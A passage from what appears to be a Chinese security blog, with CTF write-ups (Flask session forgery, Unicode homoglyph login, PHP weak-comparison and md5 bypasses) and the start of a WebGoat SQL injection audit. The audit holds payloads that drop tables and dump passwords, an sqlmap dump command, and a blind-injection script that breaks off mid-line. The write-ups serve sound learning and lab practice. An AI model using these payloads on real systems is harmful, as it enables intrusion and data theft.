session ç™»å½• session ç”¨æˆ·äº†</p><p><img src="buuctf-web7.gif" alt="img"></p><p>ç»™å½“å‰ç™»å½•ç”¨æˆ·çš„ session è§£å¯†å¦‚ä¸‹ï¼š</p><p><img src="buuctf-web7.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°å½“å‰ç™»å½•ç”¨æˆ·æ˜¯ admin123 è¾£</p><p>index.html ç•Œé¢ä¼šå›æ˜¾ç”¨æˆ·è´¦æˆ·åï¼Œç›®æµ‹æ˜¯æ ¹æ® session ä¸­çš„ name å›æ˜¾çš„ï¼ŒæŸ¥çœ‹æºä»£ç ä¸­çš„ index.html æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include(<span class="string">&#x27;header.html&#x27;</span>) %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> current_user.is_authenticated %&#125;</span><br><span class="line">&lt;h1 <span class="class"><span class="keyword">class</span>=&quot;<span class="title">nav</span>&quot;&gt;<span class="title">Hello</span> &#123;&#123; <span class="title">session</span>[&#x27;<span class="title">name</span>&#x27;] &#125;&#125;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&#123;% <span class="title">endif</span> %&#125;</span></span><br><span class="line"><span class="class">&#123;% <span class="title">if</span> <span class="title">current_user</span>.<span class="title">is_authenticated</span> <span class="title">and</span> <span class="title">session</span>[&#x27;<span class="title">name</span>&#x27;] == &#x27;<span class="title">admin</span>&#x27; %&#125;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">nav</span>&quot;&gt;<span class="title">hctf</span>&#123;<span class="title">xxxxxxxxx</span>&#125;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&#123;% <span class="title">endif</span> %&#125;</span></span><br><span class="line"><span class="class">&lt;!-- <span class="title">you</span> <span class="title">are</span> <span class="title">not</span> <span class="title">admin</span> --&gt;</span></span><br><span class="line"><span class="class">&lt;h1 <span class="keyword">class</span>=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;</span></span><br><span class="line"><span class="class">&#123;% include(&#x27;footer.html&#x27;) %&#125;</span></span><br></pre></td></tr></table></figure><p xxxxxxxxx="">å½“ session ä¸­çš„ name=admin æ—¶ï¼Œä¼šè¾“å‡º flaghctf</p><p>ä½†æ˜¯ flask session åŠ å¯†éœ€è¦ç§˜é’¥ï¼Œåœ¨ config.py ä¸­æ‰¾åˆ° SECRET_KEY=os.environ.get (â€˜SECRET_KEYâ€™) or â€˜ckj123â€™</p><p><img src="buuctf-web11.png" alt="buuctf-web11"></p><p>åˆ©ç”¨<a href="https://github.com/noraj/flask-session-cookie-manager"> flask_session åŠ è§£å¯†å·¥å…·</a>è¿›è¡Œ session åŠ è§£å¯†</p><p>å°†ä»¥ä¸‹æ•°æ®åŠ å¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;22ef025f1846ed290c3abc33091af4789157e04648638256aa7b8d41e4e27adfa91e24e72c43d5d81353bd327192646b54ca6b77e66626aab5f3d7521feba4ef&#x27;, &#x27;csrf_token&#x27;: b&#x27;62c673754392025e9b7ce0ec4fe937415e76df71&#x27;, &#x27;image&#x27;: b&#x27;wlBG&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure><p><img src="buuctf-web8.png" alt=""></p><p>æ‹¿åˆ° flagï¼Œå¥½è€¶ãƒ¾ (âœ¿ï¾Ÿâ–½ï¾Ÿ) ãƒ</p><p>ğŸ€å†æ¥æ’¸ä¸€ä¸‹<a href="http://xdxd.love/2016/10/17/unicode%E5%90%8C%E5%BD%A2%E5%AD%97%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"> unicode åŒå½¢å­—å¼•èµ·çš„å®‰å…¨é—®é¢˜</a></p><p>åœ¨è¿™é‡Œ <code>Twistedåº“çš„ç‰ˆæœ¬æ˜¯10.0.0</code></p><p>nodeprep.prepare () å‡½æ•°ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨ï¼šä¼šæŠŠå…¶ä»–ç±»çš„ç¼–ç è½¬ä¸º ascii ç ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨ï¼šå†…å®¹è½¬ä¸ºå°å†™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">á´¬á´°á´¹á´µá´º â€”&gt; ADMIN â€”&gt; admin</span><br></pre></td></tr></table></figure><p><a href="http://xn--rutes-ck2hx70mgflissmgc.py">æŸ¥çœ‹æºä»£ç  rutes.py</a>ï¼Œè‡ªå®šä¹‰ä¸€ä¸ªè½¬å°å†™å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span>    username = nodeprep.prepare(username)    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>åœ¨ä¸‰ä¸ªåŠŸèƒ½ç‚¹å¤„éƒ½è°ƒç”¨è¿‡ä¸€æ¬¡è¯¥å‡½æ•°ï¼šregisterã€loginã€change</p><p>åœ¨ç™»å½•æ—¶ï¼Œä¼šè°ƒç”¨ strlower ()ï¼Œå°†á´¬á´°á´¹á´µá´º è½¬æˆ ADMINï¼Œå­˜å‚¨åœ¨ session ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:        name = strlower(form.username.data)        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼Œæˆ‘ä»¬æ³¨å†Œä¸€ä¸ªè´¦æˆ·åä¸ºá´¬á´°á´¹á´µá´ºçš„ç”¨æˆ·ï¼Œç™»å½•åæ¬¢è¿ç•Œé¢ä¼šæ˜¾ç¤º ADMIN</p><img src="buuctf-web9.png" style="zoom:50%;" /><p>ä¿®æ”¹å¯†ç æ—¶ï¼ŒåŒæ ·ä¼šå†æ¬¡è°ƒç”¨ strlower ()ï¼Œå°† ADMIN è½¬æˆ adminï¼Œå­˜å‚¨åœ¨ session ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])        user = User.query.filter_by(username=name).first()        user.set_password(form.newpassword.data)        db.session.commit()        flash(<span class="string">&#x27;change successful&#x27;</span>)        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br></pre></td></tr></table></figure><p>å› æ­¤æ­¤æ—¶æˆ‘ä»¬ä¿®æ”¹çš„å¯†ç ä¸º admin çš„å¯†ç </p><p>ç„¶ååš¯åš¯åš¯æ‹¿åˆ° flag ãƒ¾ (ï½¥Ï‰ï½¥`ï½¡)</p><p>ğŸ€å¤§å¤±è´¥</p><p>å› ä¸ºç™»å½•æ—¶ï¼Œæ˜¯å…ˆå†™å…¥ sessionï¼Œå†åˆ¤æ–­è¯¥è´¦æˆ·æ˜¯å¦ç™»å½•æˆåŠŸ</p><p>æ”¹å¯†ç æ—¶ï¼Œéœ€è¦è·å– sessionï¼Œå†è¿›è¡Œå¯†ç ä¿®æ”¹</p><p>å› æ­¤åœ¨ç™»å½•å†™å…¥ session ä¹‹åï¼Œåˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç™»å½•æˆåŠŸé”€æ¯ session ä¹‹å‰ï¼Œæ­¤æ—¶ä¿®æ”¹å¯†ç ï¼Œå°±å¯ä»¥æˆåŠŸä¿®æ”¹ç™»å½•ç”¨æˆ·çš„å¯†ç </p><p>ä½†æ˜¯æˆ‘æ²¡æœ‰çœ‹è§ login å¤„ç™»å½•å¤±è´¥æ—¶ï¼Œä¼šé”€æ¯ session</p><p>ğŸ´æ‰€ä»¥å…ˆåœ¨ç«ç‹ä¸Šç™»å½•ä¸€ä¸ªéšä¾¿æ³¨å†Œçš„è´¦å·ï¼Œæ‰“å¼€æ›´æ”¹å¯†ç ç•Œé¢</p><p>ğŸ´å†åœ¨è°·æ­Œä¸Šç™»å½• admin è´¦å·ï¼ˆéšä¾¿è¾“å…¥å¯†ç ï¼‰</p><p>ğŸ´æœ€åä¿®æ”¹å¯†ç </p><p>ç”¨ä¿®æ”¹çš„å¯†ç ç™»å½• admin è´¦å·å¤±è´¥</p><p><strong>å‚è€ƒé“¾æ¥ï¼š</strong></p><p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581">æ­¤é¢˜ä¸‰ç§è§£æ³•</a></p><p><a href="https://www.jianshu.com/p/278d4f59839d">flask session</a></p><p><a href="https://chenlvtang.github.io/2020/05/14/Unicode%E5%B0%8F%E9%AA%97%E5%AD%90/#%E4%B8%BE%E4%B8%AA%F0%9F%8C%B0-HCTF2018-admin">Unicode å°éª—å­</a></p><p>php å¼±ç±»å‹æ¯”è¾ƒè¡¨</p><p><img src="buuctf-web10.png" alt=""></p><hr><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-buyflag"><a class="markdownIt-Anchor" href="#æå®¢å¤§æŒ‘æˆ˜-2019-buyflag">#</a> æå®¢å¤§æŒ‘æˆ˜ 2019 BuyFlag</h2><p><em>å…³é”®è¯ï¼šphpã€strcmp () ç»•è¿‡</em></p><p>ğŸ€æŸ¥çœ‹ pay.php æºç ï¼Œå‘ç°æç¤º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~~~post money <span class="keyword">and</span> password~~~<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_numeric(<span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>password å¼±æ¯”è¾ƒï¼Œpassword=404a</p><p>ğŸ€æ ¹æ® Flag need your 100000000 moneyï¼Œå¯ä»¥ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³• 1e9ï¼Œä¹Ÿå¯ä»¥é€šè¿‡<a href="https://blog.csdn.net/cherrie007/article/details/77473817"> strcmp æ¼æ´</a>ï¼Œè¿›è¡Œç»•è¿‡</p><p>money []=a æˆ–è€… money=1e9 éƒ½å¯ä»¥</p><p>ğŸ€æ ¹æ® You must be a student from CUITï¼Œå¤§æ¦‚ç‡æ˜¯åœ¨ cookie å¤„éªŒè¯èº«ä»½ä¿¡æ¯</p><p>å‘ç° cookie å¤„æœ‰ä¸€ä¸ª user=0ï¼Œæ”¹æˆ user=1 å³å¯é€šè¿‡éªŒè¯</p><hr><h2 id="bjdctf2020-easy-md5"><a class="markdownIt-Anchor" href="#bjdctf2020-easy-md5">#</a> BJDCTF2020 Easy MD5</h2><p><em>å…³é”®è¯ï¼šphpã€md5 () ç»•è¿‡</em></p><p>æŠ“åŒ…çœ‹è§å“åº”åŒ…ä¸­çš„æç¤º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure><p>çœ‹é¢˜å¦‚æœæ­£å¸¸ md5 åŠ å¯† pass è¿™ä¸ªé€»è¾‘ï¼Œè‚¯å®šæ³¨ä¸è¿›å»å“‡</p><p>è¾£å°±å»æ‰¾å…³äº md5 () è¿™ä¸ªå‡½æ•°çš„æ¼æ´</p><blockquote><p>è¯­æ³•ï¼šmd5 (string,raw)</p><p><strong>string</strong>: æ‰€éœ€åŠ å¯†çš„å­—ç¬¦ä¸²</p><p><strong>raw</strong>: å¯é€‰å‚æ•° TRUE æˆ– FALSEã€‚FALSEï¼ˆé»˜è®¤ï¼Œ32 å­—ç¬¦åå…­è¿›åˆ¶æ•°ï¼‰ï¼›TRUEï¼ˆåŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼‰</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´å½“ç¬¬äºŒä¸ªå‚æ•°ä¸º true æ—¶ï¼Œè¿”å›çš„æ˜¯åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼çš„æ•£åˆ—å€¼ï¼Œä¼šè¢«å½“åš ascii ç å­—ç¬¦ä¸²å¤„ç†ï¼ˆï¼Ÿï¼‰</p><p>â­åŸå§‹äºŒè¿›åˆ¶æ•°æ®æŒ‡åŸå§‹å­—ç¬¦ä¸²è½¬æ¢æˆ ascii ç åç»„æˆçš„å­—ç¬¦ä¸²</p><p>æ‰€ä»¥åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ª strï¼Œç»è¿‡ md5 (str, true) åŠ å¯†åï¼Œå†è½¬æˆ ascii ç å­—ç¬¦ä¸²ï¼ŒåŒ…å«æˆ‘ä»¬éœ€è¦æ³¨å…¥çš„å­—ç¬¦å³å¯</p><p>çœ‹ sql è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure><p>å°† where åçš„æ¡ä»¶æ’ä¸ºçœŸæ—¶ï¼Œæˆ‘ä»¬å°±å¯è·å– admin è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®</p><p>ğŸ´èƒ½ç”¨çš„å­—ç¬¦ä¸²</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928hex: 06da5430449f8f6f23dfc1276f722738raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#x27;or&#x27;8string: T0Do#&#x27;or&#x27;8content: ffifdyophex: 276f722736c95d99e921722cf9ed621craw: &#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1cstring: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure><p>å½“ä¸”ä»…å½“ or åå­—ç¬¦ä¸²å¼€å¤´å­—ç¬¦ä¸º 0 æ—¶ï¼Œè¿”å› false</p><p>è¾“å…¥ payloadï¼Œè·³è½¬è‡³ levels91.phpï¼Œæºç ä¸­åŒ…å«æç¤ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];<span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];<span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; md5(<span class="variable">$a</span>) == md5(<span class="variable">$b</span>))&#123;    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br></pre></td></tr></table></figure><p>å½“å­—ç¬¦ä¸² aï¼Œb ä¸ç›¸ç­‰ï¼Œmd5 åŠ å¯†åçš„å­—ç¬¦ä¸²ç›¸ç­‰åï¼Œè¿›å…¥ if ä¸­æ²¡æœ‰æ”¾å‡ºæ¥çš„ä»£ç </p><p>â­5ï¸âƒ£â‘§è¨¾ Dao ã® 4ï¼šmd5 () æˆ–è€… sha1 () ä¹‹ç±»çš„å‡½æ•°è®¡ç®—çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„å“ˆå¸Œå€¼ï¼Œå¯¹äºæ•°ç»„åˆ™è¿”å› falseï¼Œå¦‚æœ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mtext>å’Œ</mtext></mrow><annotation encoding="application/x-tex">aå’Œ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">å’Œ</span></span></span></span> b éƒ½æ˜¯æ•°ç»„åˆ™åŒåŒè¿”å› FALSE, ä¸¤ä¸ª FALSE ç›¸ç­‰å¾—ä»¥ç»•è¿‡</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=111&amp;b[]=www</span><br></pre></td></tr></table></figure><p>è·³è½¬è‡³ levell14.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>error_reporting(<span class="number">0</span>);<span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;    <span class="keyword">echo</span> <span class="variable">$flag</span>;&#125; </span><br></pre></td></tr></table></figure><p>payload (POST è¯·æ±‚):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure><p>ä¸€æ ·ã® zsd</p><p><strong>å‚è€ƒé“¾æ¥</strong></p><p><a href="https://blog.csdn.net/iczfy585/article/details/106081299">PHP ä¸­ md5 å¸¸è§ç»•è¿‡</a></p><p><a href="https://www.w3school.com.cn/php/func_string_md5.asp">PHP_md5 å‡½æ•°</a></p><p><a href="https://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/">æ¢ç©¶ php çš„ MD5 å‡½æ•°è¾“å‡ºçš„åŸå§‹äºŒè¿›åˆ¶æ•°æ®æ˜¯å•¥ï¼Ÿ</a></p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12304899.html">å“’æš—</a></p><hr><p>æœªå®Œå¾…ç»­â€¦</p>]]></content>
      
      
      <categories>
          
          <category> å¤§å†’é™© </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webgoatå®¡è®¡</title>
      <link href="/2021/01/28/dmsj/webgoat%E5%AE%A1%E8%AE%A1/"/>
      <url>/2021/01/28/dmsj/webgoat%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="æ­å»ºæ¦‚è¿°"><a class="markdownIt-Anchor" href="#æ­å»ºæ¦‚è¿°">#</a> æ­å»ºæ¦‚è¿°</h1><p>å‰æï¼š</p><ul><li>Java 11</li><li>Maven &gt; 3.2.1</li><li>IDEA</li></ul><p>ä¸‹è½½æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/WebGoat/WebGoat.git</span><br></pre></td></tr></table></figure><p>æ‰“å¼€ idea å¯¼å…¥ maven é¡¹ç›®ï¼Œbuild å®Œæˆä¹‹åï¼Œæ‰“å¼€ localhost:8080/WebGoatï¼Œæ³¨å†Œè´¦æˆ·</p><h1 id="sqlæ³¨å…¥"><a class="markdownIt-Anchor" href="#sqlæ³¨å…¥">#</a> Sql æ³¨å…¥</h1><p>select department from employees where first_name=â€˜Bobâ€™</p><p>update employees set department=â€˜Salesâ€™ where first_name=â€˜Barnettâ€™</p><p>alter table employees add column phone varchar(20)</p><p>grant alter table to UnauthorizedUser</p><p>12:â€™; update employees set salary=1000000 where last_name=â€˜Smithâ€™;â€“</p><p>13:â€™; drop table access_log;-- -</p><h2 id="æ¼æ´æè¿°"><a class="markdownIt-Anchor" href="#æ¼æ´æè¿°">#</a> æ¼æ´æè¿°</h2><p>å½“åº”ç”¨ç¨‹åºå°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹ï¼Œæ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ï¼Œä¸€èµ·æäº¤ç»™æ•°æ®åº“æ‰§è¡Œæ—¶ï¼Œå°±ä¼šäº§ç”Ÿ SQL æ³¨å…¥å¨èƒã€‚æ”»å‡»è€…é€šè¿‡æ§åˆ¶éƒ¨åˆ† SQL è¯­å¥ï¼Œå¯ä»¥æŸ¥è¯¢æ•°æ®åº“ä¸­ä»»ä½•éœ€è¦çš„æ•°æ®ï¼Œåˆ©ç”¨æ•°æ®åº“çš„ä¸€äº›ç‰¹æ€§ï¼Œç”šè‡³å¯ä»¥ç›´æ¥è·å–æ•°æ®åº“æœåŠ¡å™¨çš„ç³»ç»Ÿæƒé™ã€‚</p><h2 id="æ¼æ´æˆå› "><a class="markdownIt-Anchor" href="#æ¼æ´æˆå› ">#</a> æ¼æ´æˆå› </h2><p>å­—ç¬¦æ‹¼æ¥çš„æ–¹å¼æ‹¼æ¥ sql è¯­å¥ï¼Œå¹¶ä¸”æ²¡æœ‰åšä»»ä½•è¿‡æ»¤ç›´æ¥æ‰§è¡Œ</p><h2 id="ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®"><a class="markdownIt-Anchor" href="#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2><ol><li><p>sql-injectionâ€“&gt;SQLInjectionChanllenge</p><p>ä½¿ç”¨é¢„ç¼–è¯‘ PrepareStatementï¼Œå®ç°æ•°æ®ä»£ç åˆ†ç¦»</p><p><img src="sql1.png" alt=""></p><p>æµ‹è¯•æˆªå›¾ï¼š</p><p>æ ¹æ®ä»£ç æ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œç”¨ sqlmap è·‘ï¼Œpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r 1.txt --method PUT --data &quot;username_reg&quot; -D PUBLIC -T CHALLENGE_USERS -C password --dump</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¯èƒ½ç”±äºæœåŠ¡å™¨çš„åŸå› ï¼Œè·‘äº†å¾ˆä¹…ï¼Œè¿˜è·‘é”™äº†ï¼Œå¯†ç åº”è¯¥æ˜¯ thisisasecretfortomonly</p><p><img src="sql9.png" alt=""></p></li><li><p>sql-injectionâ€“&gt;SQLInjectionLesson6a</p><p>ä½¿ç”¨é¢„ç¼–è¯‘ PrepareStatementï¼Œå®ç°æ•°æ®ä»£ç åˆ†ç¦»<img src="sql2.png" alt=""></p><p>æµ‹è¯•æˆªå›¾ï¼š</p><p>payload (æ³¨æ„å­—æ®µç±»å‹è¦å¯¹åº”)ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select userid,user_name,password, cookie,&#x27;&#x27;,&#x27;&#x27;,0 from user_system_data --</span><br></pre></td></tr></table></figure><p><img src="sql8.png" alt=""></p></li><li><p>sql-injectionâ€“&gt;Servers</p><p>åˆ—åä¸èƒ½åŠ åŒå¼•å·ï¼Œæ‰€ä»¥åªèƒ½ç”¨å­—ç¬¦æ‹¼æ¥çš„æ–¹å¼æ‹¼æ¥ sql è¯­å¥ï¼Œå»ºè®®å¯¹åˆ—åè¿›è¡Œç™½åå•è¿‡æ»¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Server&gt; <span class="title">sort</span><span class="params">(<span class="meta">@RequestParam</span> String column)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        List&lt;Server&gt; servers = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (Connection connection = dataSource.getConnection();</span><br><span class="line">             PreparedStatement preparedStatement = connection.prepareStatement(<span class="string">&quot;select id, hostname, ip, mac, status, description from servers  where status &lt;&gt; &#x27;out of order&#x27; order by &quot;</span> + column)) &#123;</span><br><span class="line">            ResultSet rs = preparedStatement.executeQuery();</span><br><span class="line">            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                Server server = <span class="keyword">new</span> Server(rs.getString(<span class="number">1</span>), rs.getString(<span class="number">2</span>), rs.getString(<span class="number">3</span>), rs.getString(<span class="number">4</span>), rs.getString(<span class="number">5</span>), rs.getString(<span class="number">6</span>));</span><br><span class="line">                servers.add(server);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> servers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="sql4.png" alt=""></p><p>æµ‹è¯•æˆªå›¾:</p><p>sqlmap ä¸å¤ªå¥½ä½¿ï¼Œå¤ªæ…¢äº†ï¼Œç„¶åå°±çœ‹è§å¤§ä½¬å†™çš„è„šæœ¬</p><p>å¸ƒå°”ç›²æ³¨ï¼Œæ ¹æ®è¿”å›æ•°æ®çš„æ’åºæ¥åˆ¤æ–­çœŸå‡ (tql)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line">chars = digits+<span class="string">&quot;.&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;JSESSIONID&#x27;</span>: <span class="string">&#x27;D81iy9aS29fcA8JZUl1QEdeNBahRWoMFk8YyziGj&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;JSESSIONID.75fbd09e&#x27;</span>: <span class="string">&#x27;7mc1x9iei6ji4xo2a3u4kbz1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">proxy=&#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:6666&quot;</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    temp = result</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        vul_url = <span class="string">&quot;http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case%20when%20(select%20substr(ip,&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;%20from%20servers%20where%20hostname=&#x27;webgoat-prd&#x27;)%20then%20hostname%20else%20mac%20end&quot;</span>.<span class="built_in">format</span>(i, char)</span><br><span class="line">        resp = requests.get(vul_url, headers=headers, cookies=cookies, proxies=proxy)</span><br><span class="line">        <span class="comment"># print(resp.json())</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;webgoat-acc&#x27;</span> <span 